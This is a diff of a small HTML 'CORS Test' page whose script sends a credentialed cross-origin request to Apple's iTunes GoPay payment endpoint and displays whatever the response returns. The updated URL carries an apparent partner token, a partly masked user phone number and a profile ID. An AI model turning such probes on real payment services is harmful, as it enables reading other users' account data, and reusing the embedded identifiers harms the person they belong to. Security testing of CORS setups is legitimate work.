@@ -1,56 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>CORS Test</title>
-</head>
-
 <body>
-    <h2>CORS Test</h2>
-    <button onclick="testCORS()">TEST</button>
+  <button onclick="test()">Test CORS</button>
+  <pre id="result"></pre>
 
-    <pre id="result">Belum dites.</pre>
+  <script>
+    async function test() {
+      const result = document.getElementById("result");
 
-    <script>
-        async function testCORS() {
+      try {
+        const response = await fetch(
+          "https://p11-buy.itunes.apple.com/payment/userSigned/GoPay?result=success&clientType=is&creditType=ADGP&safariid=ExternalPaymentVerificationController&iso3CountryCode=IDN&appInstalled=1&context=edit&isMobile=true&partnerToken=1787058395565-778534825&redirectUrl=ams-sdu%253A%252F%252F%253Fbundle%253Dcom.apple.Preferences&success=true&userId=+62xxxxxxx9239&profileId=01-7482224826d54996825c7f15b9b1959f-25",
+          {
+            method: "GET",
+            credentials: "include"
+          }
+        );
 
-            const target =
-                "https://p11-buy.itunes.apple.com/payment/userSigned/GoPay" +
-                "?result=success" +
-                "&clientType=is" +
-                "&creditType=SHPY" +
-                "&safariid=ExternalPaymentVerificationController" +
-                "&iso3CountryCode=IDN" +
-                "&appInstalled=1" +
-                "&context=edit" +
-                "&isMobile=true";
+        result.textContent =
+          "Status: " + response.status + "\n" +
+          "Type: " + response.type + "\n\n" +
+          await response.text();
 
-            const result = document.getElementById("result");
-
-            try {
-
-                const response = await fetch(target, {
-                    method: "GET",
-                    credentials: "include"
-                });
-
-                const body = await response.text();
-
-                result.textContent =
-                    "REQUEST BERHASIL\n\n" +
-                    "Status: " + response.status + "\n" +
-                    "Response Type: " + response.type + "\n" +
-                    "Final URL: " + response.url + "\n\n" +
-                    "Response Body:\n" +
-                    body;
-
-            } catch (error) {
-
-                result.textContent =
-                    "REQUEST GAGAL / CORS BLOCKED\n\n" +
-                    error;
-            }
-        }
-    </script>
+      } catch (e) {
+        result.textContent = "ERROR:\n" + e;
+      }
+    }
+  </script>
 </body>
 </html>
